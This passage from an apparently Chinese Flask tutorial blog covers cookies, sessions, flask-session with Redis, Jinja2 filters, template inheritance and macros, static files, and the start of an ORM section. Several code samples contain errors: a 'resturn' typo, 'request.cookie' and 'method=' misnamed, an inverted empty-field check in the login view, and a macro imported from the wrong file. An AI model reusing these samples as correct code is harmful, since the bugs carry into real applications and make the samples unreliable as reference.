class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        secure: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        httponly: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        samesite: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>):<span class="keyword">pass</span></span><br></pre></td></tr></table></figure></li>
</ol>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    response = make_response(<span class="string">&quot;进入登录页面&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 添加cookie</span></span><br><span class="line">    <span class="comment"># response.delete_cookie(&#x27;username&#x27;)</span></span><br><span class="line">    <span class="comment"># expire_datatime = datetime.strptime(&#x27;2022-06-01 06:00:00&#x27;,&#x27;%Y-%m-%d %H:%M:%S&#x27;)</span></span><br><span class="line">    <span class="comment"># response.set_cookie(&#x27;username&#x27;,&#x27;disen&#x27;, expires=expire_datatime)</span></span><br><span class="line">    response.set_cookie(<span class="string">&#x27;email&#x27;</span>,<span class="string">&#x27;11111222222@qq.com&#x27;</span>,max_age=<span class="number">1209600</span>)</span><br><span class="line">    <span class="keyword">return</span> response</span><br></pre></td></tr></table></figure>

<h3 id="2-1-2-将客户端的cookie删除"><a href="#2-1-2-将客户端的cookie删除" class="headerlink" title="2.1.2 将客户端的cookie删除"></a>2.1.2 将客户端的cookie删除</h3><p>使用响应对象的delete_cookie()方法</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">delete_cookie</span>(<span class="params"></span></span><br><span class="line"><span class="params">        self,</span></span><br><span class="line"><span class="params">        key: <span class="built_in">str</span>,</span></span><br><span class="line"><span class="params">        path: <span class="built_in">str</span> = <span class="string">&quot;/&quot;</span>,</span></span><br><span class="line"><span class="params">        domain: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">        secure: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        httponly: <span class="built_in">bool</span> = <span class="literal">False</span>,</span></span><br><span class="line"><span class="params">        samesite: t.<span class="type">Optional</span>[<span class="built_in">str</span>] = <span class="literal">None</span>,</span></span><br><span class="line"><span class="params">    </span>):<span class="keyword">pass</span></span><br></pre></td></tr></table></figure>

<p>【注意】根据不同浏览器特性，可能删除不了，需要到浏览器删除。</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/delcookie/&lt;cookie_name&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">del_cookie</span>(<span class="params">cookie_name</span>):</span><br><span class="line">	resp = make_response(<span class="string">&#x27;删除cookie&#x27;</span>)</span><br><span class="line">	resp.delete_cookie(cookie_name)</span><br><span class="line">	resturn resp</span><br></pre></td></tr></table></figure>

<h3 id="2-1-3-从请求对象中获取cookie"><a href="#2-1-3-从请求对象中获取cookie" class="headerlink" title="2.1.3 从请求对象中获取cookie"></a>2.1.3 从请求对象中获取cookie</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/find&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find</span>():</span><br><span class="line">	<span class="comment"># 客户端的cookie信息随着请求发送，自动将浏览器中的cookie附加到请求中</span></span><br><span class="line">	<span class="comment"># 可以从请求对象中获取浏览器的cookie信息</span></span><br><span class="line">	email = request.cookie.get(<span class="string">&#x27;email&#x27;</span>) <span class="comment"># value</span></span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="2-2-会话Session"><a href="#2-2-会话Session" class="headerlink" title="2.2 会话Session"></a>2.2 会话Session</h2><p>会话技术，一般是指客户端与服务端建立的连接，针对HTTP协议来说，会话连接称之为Session。在HTTP/1.0版本上，会话都是一次性，请求与响应的一个完整过程基于session。到HTTP/1.1时，会话是长连接，多个请求与响应共享一个会话。是否为长连接，可以查看响应、请求头connection，如果它的值是keep-alive表示长连接。因为Session是多个请求的共享资源，所以在Session存数据时，多个请求都可以访问。</p>
<p>【注意】在flask中使用session时，需要设置一个安全密钥secret_key。</p>
<p>一般Session使用场景：用户登录、退出、验证用户、城市定位</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> session</span><br><span class="line"><span class="meta">@blue.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>, method=[<span class="string">&#x27;GET&#x27;</span>,<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">	<span class="keyword">if</span> request.method == <span class="string">&#x27;POST&#x27;</span>:</span><br><span class="line">        <span class="comment"># 读取登录用户信息</span></span><br><span class="line">        <span class="comment"># 前端页面表单域：name, password</span></span><br><span class="line">        name = request.form.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">        password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">all</span>((name, password)): <span class="comment"># 验证是否为空</span></span><br><span class="line">            message = <span class="string">&quot;用户名或口令不能为空&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="comment"># 将数据写入数据库</span></span><br><span class="line">            dao = UserDao()</span><br><span class="line">            <span class="comment"># dao.save(name=name, password=password) # 注册时使用</span></span><br><span class="line">            user = dao.login(name, password) <span class="comment"># 如果存在此用户，则返回用户信息，dict</span></span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> user:</span><br><span class="line">                message = <span class="string">&quot;查无%s此用户，请确认用户名或口令正确！&quot;</span> % name</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">            	<span class="comment"># 用户信息</span></span><br><span class="line">            	session[<span class="string">&#x27;login_user&#x27;</span>] = user</span><br><span class="line">                </span><br><span class="line">            	<span class="comment"># 重定向到主页</span></span><br><span class="line">            	<span class="keyword">return</span> redirect(<span class="string">&#x27;/index&#x27;</span>)</span><br><span class="line">            </span><br><span class="line">	<span class="keyword">return</span> render_template(<span class="string">&#x27;user/login.html&#x27;</span>, <span class="built_in">locals</span>())</span><br></pre></td></tr></table></figure>

<p>locals()将当前函数内部的变量生成字典对象，变量名即是字典的key，变量值即是key对应的value。</p>
<h1 id="WEB服务Flask第三天"><a href="#WEB服务Flask第三天" class="headerlink" title="WEB服务Flask第三天"></a>WEB服务Flask第三天</h1><h2 id="一、Flask-Session插件"><a href="#一、Flask-Session插件" class="headerlink" title="一、Flask-Session插件"></a>一、Flask-Session插件</h2><p>补充说明：session解决每个客户端中将数据共享在多个请求中，即为每个客户端（client）都会创建session会话连接。问题是服务端如何判断session属于哪一个客户端的。在HTTP协议中已经考虑此问题，解决方案是在cookie中存储一个session_id，当请求发送给服务器时，cookie信息也会传给服务器，服务器以此session_id确定当前请求是属于哪一个session会话的。</p>
<p><strong>在flask中默认情况下，session的数据存在cookie中（客户端）</strong>。通过flask-session插件，解决将session的数据存储在数据库中或缓存（Redis）中。</p>
<p>首先安装flask-session插件</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pip install flask-session</span><br><span class="line">pip install redis==<span class="number">2.10</span><span class="number">.6</span> -i https://mirrors.aliyun.com/pypi/simple</span><br></pre></td></tr></table></figure>

<p>配置flask的session信息，在settings.py脚本中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> redis <span class="keyword">import</span> Redis</span><br><span class="line"><span class="keyword">class</span> <span class="title class_">Dev</span>():</span><br><span class="line">    ENV = <span class="string">&#x27;developement&#x27;</span> <span class="comment"># 默认运行环境production</span></span><br><span class="line">    SECRET_KEY = <span class="string">&#x27;!zaq&amp;wsx$&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置session</span></span><br><span class="line">    SESSION_TYPE = <span class="string">&#x27;redis&#x27;</span></span><br><span class="line">    SESSION_REDIS = Redis(host=<span class="string">&#x27;192.168.200.4&#x27;</span>, db=<span class="number">8</span>)</span><br></pre></td></tr></table></figure>

<p>在创建flask的脚本中</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, render_template</span><br><span class="line"><span class="keyword">from</span> flask_session <span class="keyword">import</span> Session</span><br><span class="line"><span class="keyword">import</span> settings</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"><span class="comment"># 从指定的对象中加载flask服务的配置</span></span><br><span class="line">app.config.from_object(settings.Dev())</span><br><span class="line"></span><br><span class="line">session = Session()</span><br><span class="line">session.init_app(app) <span class="comment"># 初始化session插件</span></span><br></pre></td></tr></table></figure>

<p>session的使用跟之前用法相同，即从flask库中导入session对象即可。</p>
<h2 id="二、模板技术与静态资源"><a href="#二、模板技术与静态资源" class="headerlink" title="二、模板技术与静态资源"></a>二、模板技术与静态资源</h2><h3 id="2-1template模板"><a href="#2-1template模板" class="headerlink" title="2.1template模板"></a>2.1template模板</h3><p>Flask使用了Jinja2模板技术，支持变量、循环与分支以及自定义标签，支持点“.”语法，如：</p>
<p>1、对象.属性</p>
<p>2、列表.索引下标</p>
<p>3、字典.key</p>
<p>模板的html文件存放在templates目录中，templates目录下的所有html网页文件，内部都可以使用jinja2模板的语法，但是html文件必须在view视图函数中通过render_template(‘xx.html’)渲染，即渲染模板文件就是解析模板语法。</p>
<h4 id="2-1-1-模板过滤器"><a href="#2-1-1-模板过滤器" class="headerlink" title="2.1.1 模板过滤器"></a>2.1.1 模板过滤器</h4><p>过滤器主要针对模板中变量的数据进行处理，如日期的格式化、字符串格式化、大小写转换以及列表元素的提取等处理。</p>
<p>参考源码：jinja2.filters.py文件</p>
<h5 id="2-1-1-1-常用的过滤器"><a href="#2-1-1-1-常用的过滤器" class="headerlink" title="2.1.1.1 常用的过滤器"></a>2.1.1.1 常用的过滤器</h5><p>1.字符串过滤器</p>
<p>（1）capitalize 首字母大写；（2）title 每个单词的首字母大写；（3）upper 大写转换；（4）lower 小写转换；（5）format 格式化字符串，类似于%s格式化；（6）trim 删除两边的空格，类似于字符串的strip()函数；（7）default 指定默认值</p>
<p>2.列表（可迭代）过滤器</p>
<p>（1）unique 去掉重复的元素；（2）join 使用指定字符，连接可迭代对象中每一个元素；（3）last 读取最后一个元素；（4）first 读取第一个元素；（5）slice 切分指定元素个数的多个子列表；（6）random随机读取列表中的某一个元素；</p>
<p>（7）sort 排序；（8）list 将生成器、可迭代对象转成list。</p>
<p>3.安全性过滤器</p>
<p>（1）striptags 删除字符串所有html标签（开始、结束）；（2）safe 渲染字符串的html标签，不会进行escape转换；（3）make_safe；（5）make_unsafe。</p>
<p>4.数值过滤器</p>
<p>（1）int 转成int；（2）float 转成float类型；（filesizeformat 按文件大小的格式转换）；（3）round 四舍五入，precision=0, method=”common|ceil|floor”；</p>
<h5 id="2-1-1-2-自定义过滤器"><a href="#2-1-1-2-自定义过滤器" class="headerlink" title="2.1.1.2 自定义过滤器"></a>2.1.1.2 自定义过滤器</h5><p>如果提供的过滤器不满足现有的需求，可以自定义过滤器</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 自定义模板过滤器</span></span><br><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;datefmt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">datefmt_filter</span>(<span class="params">value, *args</span>):</span><br><span class="line">    <span class="comment"># value是datatime类型</span></span><br><span class="line">    <span class="built_in">print</span>(value, <span class="built_in">type</span>(value), args)</span><br><span class="line">    <span class="keyword">return</span> value.strftime(args[<span class="number">0</span>])</span><br></pre></td></tr></table></figure>

<p>自定义过滤器，实现货币格式化</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.template_filter(<span class="params"><span class="string">&#x27;moneyfmt&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">moneyfmt_filter</span>(<span class="params">value, method=<span class="string">&quot;common&quot;</span>, precision=<span class="number">0</span></span>):</span><br><span class="line">    <span class="comment"># method == &#x27;common&#x27; 普通的金额的格式化，以千位符分隔</span></span><br><span class="line">    value = <span class="built_in">round</span>(value, precision)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> method == <span class="string">&#x27;common&#x27;</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">isinstance</span>(value, <span class="built_in">int</span>):</span><br><span class="line">            pre_v = <span class="built_in">str</span>(value)</span><br><span class="line">            end_v = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            pre_v, end_v = <span class="built_in">str</span>(value).split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">            end_v = <span class="string">&quot;.&quot;</span> + end_v</span><br><span class="line"></span><br><span class="line">        pre_v = pre_v[::-<span class="number">1</span>]</span><br><span class="line">        vs = [pre_v[i*<span class="number">3</span>:i*<span class="number">3</span>+<span class="number">3</span>] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(math.ceil(<span class="built_in">len</span>(pre_v)/<span class="number">3</span>))]</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&#x27;,&#x27;</span>.join(vs)[::-<span class="number">1</span>] + end_v</span><br><span class="line"></span><br><span class="line">    <span class="comment"># method == &#x27;currency&#x27; 货币单位，万，百万，千万，亿</span></span><br><span class="line">    cur = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    <span class="keyword">if</span> value / <span class="number">10000</span> &lt; <span class="number">1</span>:</span><br><span class="line">        cur = <span class="string">&#x27;元&#x27;</span></span><br><span class="line">    <span class="keyword">elif</span> value / (<span class="number">100</span>*<span class="number">10000</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        cur = <span class="string">&#x27;万元&#x27;</span></span><br><span class="line">        value = <span class="built_in">round</span>(value / <span class="number">10000</span>, <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> value / (<span class="number">1000</span>*<span class="number">10000</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        cur = <span class="string">&#x27;百万元&#x27;</span></span><br><span class="line">        value = <span class="built_in">round</span>(value / (<span class="number">100</span>*<span class="number">10000</span>), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">elif</span> value / (<span class="number">10000</span>*<span class="number">10000</span>) &lt; <span class="number">1</span>:</span><br><span class="line">        cur = <span class="string">&#x27;千万元&#x27;</span></span><br><span class="line">        value = <span class="built_in">round</span>(value / (<span class="number">1000</span>*<span class="number">10000</span>), <span class="number">2</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        cur = <span class="string">&#x27;亿元&#x27;</span></span><br><span class="line">        value = <span class="built_in">round</span>(value / (<span class="number">10000</span>*<span class="number">10000</span>), <span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">str</span>(value)+cur</span><br></pre></td></tr></table></figure>

<p>上面的过滤器，定义了两个格式的金额表示，common是以千位符分隔的，currency是不同单位计算的。</p>
<h4 id="2-1-2-布局模板标签"><a href="#2-1-2-布局模板标签" class="headerlink" title="2.1.2 布局模板标签"></a>2.1.2 布局模板标签</h4><p>又称之为结构标签，设计整体页面。如将页面分为上、左、右、下四部分。在子页面中可以继承布局的模板文件，有针对性的实现哪一部分，如只实现右边结构的内容。</p>
<p>创建base.html模板文件，声明页面的结构。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>&#123;% block title %&#125; 主页 &#123;% endblock %&#125;<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><figcaption><span>block title %&#125;  &#123;% endblock %&#125;``` 声明块区域，它的结构被定义title名称。</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">```&#123;% block content %&#125;  &#123;% endblock %&#125;``` 声明content内容显示的块区域。</span><br><span class="line"></span><br><span class="line">再创建index.html，此页面不需要像base.html那样，将html完整的标签写出来，只需要继承base.html，再使用```&#123;% block title %&#125;  &#123;% endblock %&#125; ```可以填充base.html页面的内容。</span><br><span class="line"></span><br><span class="line">```html</span><br><span class="line">&#123;% extends &quot;base.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">这是我的主页</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &lt;h3&gt;测试block结构标签&lt;/h3&gt;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>如果index.html又被其他子页面继承，在子页面填充的内容会覆盖父一级填充块的内容。如果想保留父级填充块的内容，则在<code>&#123;% block %&#125;  &#123;% endblock %&#125; </code>两个标签之间增加<code>&#123;&#123; super() &#125;&#125;</code>.</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&#123;% extends &quot;index.html&quot; %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block title %&#125;</span><br><span class="line">    第三级的标题-主页</span><br><span class="line">&#123;% endblock %&#125;</span><br><span class="line"></span><br><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>以后在此显示内容<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>可以使用<code>&#123;% include "500.html" %&#125;</code>标签将指定网页内容填充到当前位置。</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&#123;% block content %&#125;</span><br><span class="line">    &#123;&#123; super() &#125;&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">h4</span>&gt;</span>以后在此显示内容<span class="tag">&lt;/<span class="name">h4</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    &#123;% include &quot;500.html&quot; %&#125;</span><br><span class="line">&#123;% endblock %&#125;</span><br></pre></td></tr></table></figure>

<p>include和extends的区别：</p>
<ul>
<li>include导入整个网页，但是不能进行修改</li>
<li>extends只是继承网页，修改感兴趣的block</li>
</ul>
<h4 id="2-1-3-模板宏标签"><a href="#2-1-3-模板宏标签" class="headerlink" title="2.1.3 模板宏标签"></a>2.1.3 模板宏标签</h4><p>可以在html文件中使用<code>&#123;% macro 函数名() %&#125;</code>定义宏函数，它用于生成特定的html标签，而且在之后可以重复使用。</p>
<p>在macro.html，内容如下：</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">&#123;% macro menu() %&#125;</span><br><span class="line">    <span class="tag">&lt;<span class="name">ul</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>用户管理<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>库存管理<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">li</span>&gt;</span>角色管理<span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">ul</span>&gt;</span></span><br><span class="line">&#123;% endmacro %&#125;</span><br></pre></td></tr></table></figure>

<p>在index.html中使用时，需要使用<code>&#123;% from %&#125;</code>标签将宏函数导入到当前的模板中</p>
<figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&#123;% from &quot;404.html&quot; import menu %&#125;</span><br><span class="line"></span><br><span class="line">&#123;&#123; menu() &#125;&#125;</span><br></pre></td></tr></table></figure>

<h4 id="2-1-4-模板分支循环标签"><a href="#2-1-4-模板分支循环标签" class="headerlink" title="2.1.4 模板分支循环标签"></a>2.1.4 模板分支循环标签</h4><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">ol</span>&gt;</span></span><br><span class="line">            &#123;% for item in menus %&#125;</span><br><span class="line">                <span class="tag">&lt;<span class="name">li</span> &#123;% <span class="attr">if</span> <span class="attr">loop.index</span> % <span class="attr">2</span> !=<span class="string">0</span> %&#125;<span class="attr">class</span>=<span class="string">&quot;odd&quot;</span> &#123;% <span class="attr">endif</span> %&#125; &gt;</span> &#123;&#123; item &#125;&#125; <span class="tag">&lt;/<span class="name">li</span>&gt;</span></span><br><span class="line">            &#123;% endfor %&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">ol</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">hr</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>loop循环信息：loop.first    loop.last    loop.index    loop.index0    loop.revindex    loop.revindex0</p>
<h3 id="2-2-静态资源文件"><a href="#2-2-静态资源文件" class="headerlink" title="2.2 静态资源文件"></a>2.2 静态资源文件</h3><p>flask默认情况下指定在static目录中，访问路径也是/static，可以在创建flask对象时，指定static_folder和static_url_path两个参数。</p>
<p>static_folder指定静态资源文件存放的目录，一般情况下，静态资源存放的是css、js、图片素材、字体等。</p>
<p>static_url_path指定静态资源文件访问的url路径，默认是“/static”，如指定“/s”，针对static目录下的css下的my.css样式，完整访问路径url应该是：<a target="_blank" rel="noopener" href="http://localhost:5000/s/css/my.css%E3%80%82">http://localhost:5000/s/css/my.css。</a></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(__name__, static_folder=<span class="string">&#x27;static&#x27;</span>, static_url_path=<span class="string">&#x27;/s&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>也可以在settings.py文件文件配置, <font color=pink size=4>但不建议使用此方法。</font></p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Dev</span>():</span><br><span class="line">    ENV = <span class="string">&#x27;developement&#x27;</span> <span class="comment"># 默认运行环境production</span></span><br><span class="line">    SECRET_KEY = <span class="string">&#x27;!zaq&amp;wsx$&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置session</span></span><br><span class="line">    SESSION_TYPE = <span class="string">&#x27;redis&#x27;</span></span><br><span class="line">    SESSION_REDIS = Redis(host=<span class="string">&#x27;192.168.200.4&#x27;</span>, db=<span class="number">8</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># 配置静态资源目录及访问的URL</span></span><br><span class="line">    STATIC_FOLDER = <span class="string">&#x27;static&#x27;</span></span><br><span class="line">    STATIC_URL_PATH = <span class="string">&#x27;/s&#x27;</span></span><br></pre></td></tr></table></figure>

<h1 id="WEB后端服务-Flask第四天"><a href="#WEB后端服务-Flask第四天" class="headerlink" title="WEB后端服务-Flask第四天"></a>WEB后端服务-Flask第四天</h1><h2 id="一、数据库操作之ORM设计思想"><a href="#一、数据库操作之ORM设计思想" class="headerlink" title="一、数据库操作之ORM设计思想"></a>一、数据库操作之ORM设计思想</h2><p>相对于数据库的操作，设计DAO结构的目的是简化数据库的操作，把SQL语句封装到基础类（BaseDao）中，但是要求开发人员必须特别熟悉SQL语句和Python的基础。自己设计Dao的优点是有效防止SQL注入风险。通过使用ORM避免不会SQL的开发人员能够快速操作数据库，ORM的思想是将实体类（Model或Entries）和数据库表直接建立关联关系，即类-&gt;表，类对象-&gt;表中的记录，类对象的属性-&gt;表的字段。</p>
<p>ORM(Object Relationship Mapping)对象关系映射。</p>
<ul>
<li><p>类和表</p>
</li>
<li><p>类实例即时表的记录</p>
</li>
<li><p>类属性即为表的字段</p>
<p>当ORM关系映射成功之后，直接操作类和对象，即操作数据库中表或记录。</p>
<p>简单地实现ORM(自省+元类)：</p>
